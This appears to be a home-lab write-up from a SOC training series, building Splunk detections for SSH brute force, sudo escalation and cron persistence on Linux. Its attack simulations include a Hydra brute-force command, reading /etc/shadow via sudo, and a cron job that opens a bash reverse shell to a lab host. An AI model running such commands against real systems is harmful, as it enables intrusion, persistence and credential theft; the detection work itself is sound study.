# Week 4: Linux Syslog & Auditd Detection

**Date:** June 2-3, 2026  
**Difficulty:** Intermediate  
**Duration:** ~3 hours  
**Confidence After:** 4-5/10 — New log ecosystem, lots of surface area

## Overview

Week 4 expands detection to **Linux endpoints** using syslog and auditd. We establish baselines for Linux authentication logs, detect SSH brute force using Hydra, privilege escalation via sudo, and cron-based persistence.

**Key Outcome:** Detect T1110.001 (SSH brute force), T1548.003 (sudo privilege escalation), T1053.003 (cron persistence), with full command execution visibility.

## Linux Log Sources

| File | Sourcetype | Contents | Status |
|---|---|---|---|
| /var/log/auth.log | linux_secure | SSH logins, sudo usage, PAM authentication | ✅ |
| /var/log/syslog | syslog | General system activity, cron, daemons | ✅ |
| /var/log/audit/audit.log | audit | auditd rules-based syscall monitoring | ✅ |
| ~/.bash_history | bash_history | Command history (passive investigation) | ✅ |

**Splunk Add-on:** Splunk Add-on for Unix and Linux (parses user, src automatically but drops command arguments from sudo lines)

## Tasks Completed

### Task 1: Establish Linux Log Baseline

**Verification:**
```spl
index=linux | stats count by host, sourcetype
```

**Result:**
- linux_secure: 142 events (SSH auth, sudo activity)
- syslog: 2452 events (general system)
- audit: 546 events (auditd syscalls)
- bash_history: 6 events (passive)

**Baseline:** Clean Linux environment with normal system activity, no suspicious processes or failed auth attempts.

### Task 2: Detect SSH Brute Force (T1110.001)

**Attack Simulation:**
```bash
# From Kali (10.10.40.1), brute force Parrot (10.10.40.2)
hydra -l netcur10s -P /usr/share/wordlists/rockyou.txt ssh://10.10.40.2 -t 4 -V
```

**Result:** 306 failed password attempts in 5 minutes

**Detection Query:**
```spl
index=linux sourcetype=linux_secure "Failed password" 
| rex field=_raw "Failed password for (?<target_user>\S+) from (?<src_ip>\S+)" 
| bucket _time span=60s 
| stats count by _time, src_ip, target_user, host 
| where count >= 5 
| sort -count
```

**Alert Threshold:** 5+ failures from same source in 60 seconds

**Result:** ✅ Detected brute force attempt; identified attacker IP and target user

**SSH Brute Force Detection:**

![Hydra SSH Brute Force Attack](./screenshots/week4-01-hydra-brute-force.png)
*Hydra command running from Kali (10.10.40.1) against Parrot SSH server (10.10.40.2) with 306 attempted logins*

![Failed Login Events - Splunk Detection](./screenshots/week4-02-ssh-failed-logins.png)
*Splunk showing 306 failed password events from single source IP with target user identified*

![Detection Query Results](./screenshots/week4-03-ssh-detection-query.png)
*Splunk detection query results: 5-minute buckets with count >= 5 failures triggering alert*

### Task 3: Detect Sudo Privilege Escalation (T1548.003)

**Attack Simulation:**
```bash
# As netcur10s user, escalate to root
sudo cat /etc/shadow
# Grants access to root-owned shadow file
```

**Problem:** Linux TA parses user/src but **drops command arguments** from sudo lines

**Solution:** Use `rex` to extract full COMMAND field
```spl
index=linux sourcetype=linux_secure 
| rex field=_raw "(?<sudo_user>\S+) : TTY=(?<tty>\S+) ; PWD=(?<pwd>\S+) ; USER=(?<as_user>\S+) ; COMMAND=(?<command>.+)" 
| search as_user=root command="*" 
| table _time, host, sudo_user, as_user, command 
| sort -_time
```

**Result:** ✅ Detected sudo cat /etc/shadow with full command visibility

**Key Finding:** Access to /etc/shadow as non-root = privilege escalation indicator

**Sudo Escalation Detection:**

![SSH Terminal - Sudo Shadow Command](./screenshots/week4-04-sudo-shadow-command.png)
*SSH session showing netcur10s user running `sudo cat /etc/shadow` to access root-owned password hashes*

![Splunk Sudo Command with Full Context](./screenshots/week4-05-splunk-sudo-extracted.png)
*Splunk showing extracted sudo session: sudo_user=netcur10s, as_user=root, COMMAND="cat /etc/shadow" - clear privilege escalation*

### Task 4: Detect Cron Persistence (T1053.003)

**Attack Simulation:**
```bash
# As netcur10s, add reverse shell to cron
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.40.1/4444 0>&1'") | crontab -
```

**Result:** Job fires every minute, logs appear in syslog

**Detection Query:**
```spl
index=linux sourcetype=syslog "CRON" 
| rex field=_raw "(?<cron_user>\S+) CMD \((?<cron_command>.+)\)" 
| search cron_command="*" 
| table _time, host, cron_user, cron_command 
| sort -_time
```

**Pattern:** Cron commands with suspicious bash/nc commands firing at regular intervals

**Result:** ✅ Detected reverse shell cron job (every minute, visible in syslog)

**Cron Persistence Detection:**

![Cron Job Added - Reverse Shell](./screenshots/week4-06-cron-reverse-shell.png)
*Terminal showing cron job added for netcur10s user: `* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.40.1/4444 0>&1'` executing reverse shell every minute*

![Splunk Cron Detection - CRON CMD Entries](./screenshots/week4-07-splunk-cron-detection.png)
*Splunk syslog showing repeated CRON CMD entries every minute with bash command visible - clear persistence mechanism*

### Task 5: Auditd Event Analysis

**Key Auditd Event Types:**

| Type | Meaning | Detection Use |
|---|---|---|
| LOGIN | User login event | SSH brute force detection |
| SYSCALL | System call made by process | File access, privilege use |
| PROCTITLE | Full process command | Complete command context |
| USER_ACCT | Account used for auth | Authentication tracking |
| CRED_ACQ/DISP | Credential acquired/disposed | PAM authentication activity |
| SERVICE_START/STOP | System services | Persistence detection |

**Query for Linux Auth Anomalies:**
```spl
index=linux sourcetype=audit type=LOGIN 
| stats count by acct, res 
| where count > 5
```

**Result:** Can track failed logins across entire Linux environment

**Screenshot Placeholders:**
- [ ] Screenshot: Auditd event showing LOGIN type with failed res=0
- [ ] Screenshot: SYSCALL event showing shadow file access

### Task 6: Troubleshooting: Kali dpkg Conflict

**Issue:** Hydra installation failed due to pyinstaller-hooks-contrib package conflict

**Error:**
```
E: trying to overwrite '/usr/lib/python3/dist-packages/pyinstaller_hooks_contrib'
```

**Fix:**
```bash
sudo dpkg --remove --force-all python3-pyinstaller-hooks-contrib
sudo apt --fix-broken install -y
```

**Lesson:** Sometimes brute-force removal is necessary; use force flags only when confident.

## Key Learnings

- **Linux TA has limitations:** Automatic parsing of user/src works, but COMMAND arguments dropped; must use rex for full visibility
- **auditd is powerful but requires understanding:** Different event types for different use cases; type=LOGIN != type=SYSCALL
- **Cron jobs are easily visible:** Logs appear in syslog automatically; no special configuration needed
- **Regex patterns take iteration:** Built patterns by reading raw logs first, identifying context, then writing rex capture groups
- **SSH brute force detection is reliable:** Failed password events are consistent and easy to threshold

## Splunk Queries Built

| Detection | Query | Confidence |
|---|---|---|
| SSH Brute Force (5+ failures/60s) | Reliable with low false positives | High |
| Sudo Privilege Escalation to Root | Requires custom rex pattern | High |
| Cron Persistence | Detects command at regular intervals | Very High |
| Failed Auth Anomalies | Auditd LOGIN events | Medium |

**Week 4 Status:** ✅ COMPLETE  
**Confidence:** 4-5/10 (new ecosystem, comfortable with core techniques)

## Navigation

← [Back to Main SOC Lab Overview](../Readme.md)  
[Week 5: Network Detection →](./Week5-Network-Detection.md)